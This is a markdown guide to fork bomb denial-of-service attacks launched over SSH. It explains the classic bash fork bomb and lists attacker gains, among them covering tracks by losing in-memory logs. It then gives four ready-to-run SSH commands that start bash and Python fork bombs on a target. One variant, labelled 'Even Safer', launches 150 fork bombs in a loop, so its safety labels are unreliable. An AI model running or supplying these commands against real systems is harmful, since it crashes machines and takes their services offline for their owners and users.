# Fork Bomb Attack via SSH

## Overview
A **Fork Bomb** (also known as a rabbit virus or wabbit) is a type of Denial of Service (DoS) attack against a computer system. It works by rapidly creating a large number of processes (forking) until the system's process table is saturated.

Once the process table is full, the operating system can no longer create new processes, rendering the system unresponsive and often leading to a complete freeze or crash, requiring a hard reboot.

---

## How the Attack Works
1. **The Core Mechanism**: In Unix-like systems, the `fork()` system call is used by a process to create a copy of itself.
2. **Infinite Loop**: A fork bomb is essentially an infinite loop where a process forks itself, and each newly created child process immediately forks itself again.
3. **Resource Exhaustion**: This exponential growth rapidly consumes system resources, specifically Process IDs (PIDs), CPU time, and memory.
4. **Denial of Service**: Legitimate programs (or administrative commands to stop the attack) cannot be executed because the system cannot assign them a new PID.

### Explaining the Classic Bash Fork Bomb: `:(){ :|:& };:`
- `:` - Defines a function named `:`.
- `()` - Indicates it takes no arguments.
- `{ ... }` - The body of the function.
- `:|:&` - The core logic. It calls the function `:` and pipes its output into another instance of the function `:`, running both in the background (`&`).
- `;` - Ends the function definition.
- `:` - Calls the function for the first time to start the chain reaction.

---

## Attacker's Gain
- **System Disruption**: Causes immediate and severe Denial of Service (DoS) on the target machine.
- **Service Outage**: Takes offline any web servers, databases, or critical services running on the machine.
- **Covering Tracks**: A sudden system crash/reboot might cause temporary logs held in memory to be lost before they are written to disk.
- **Testing Resilience**: In an authorized scenario, it tests if the system has proper resource limits configured (`ulimit` / `cgroups`) to prevent a single user from crashing the whole machine.

---

## Fork Bomb Commands via SSH (For Authorized Testing Only)

### 1. Basic Fork Bomb via SSH (Most Common)
```bash
ssh user@target_ip '
:(){ :|:& };:
'
```

### 2. More Controlled / Visible Fork Bomb (Recommended for Testing)
```bash
ssh user@target_ip '
echo "[+] Starting Fork Bomb Simulation on $(hostname)";
:(){ :|:& };:
'
```

### 3. Even Safer Version with Delay & Limit (Better for EDR Testing)
```bash
ssh user@target_ip '
echo "[+] Starting Controlled Fork Bomb Simulation";
for i in {1..150}; do
  :(){ :|:& };: &
  sleep 0.1
done
echo "[+] Fork bomb launched - Watch system resources"
'
```

### 4. Ultra Aggressive Version (High Impact)
```bash
ssh user@target_ip '
python3 -c "
import os
while True:
    os.fork()
" > /dev/null 2>&1 &
echo "[+] Python-based fork bomb started in background"
'
```

---

## ⚠️ Important Notes
- **Warning**: Fork bombs can crash or freeze the target machine. Use only in isolated test environments.
- Run it with low intensity first.
- To stop it (if possible), you may need to reboot the target or kill processes aggressively from another session.
- Monitor the target with `htop`, `top`, or `watch -n 1 "ps aux | wc -l"` before and during the attack.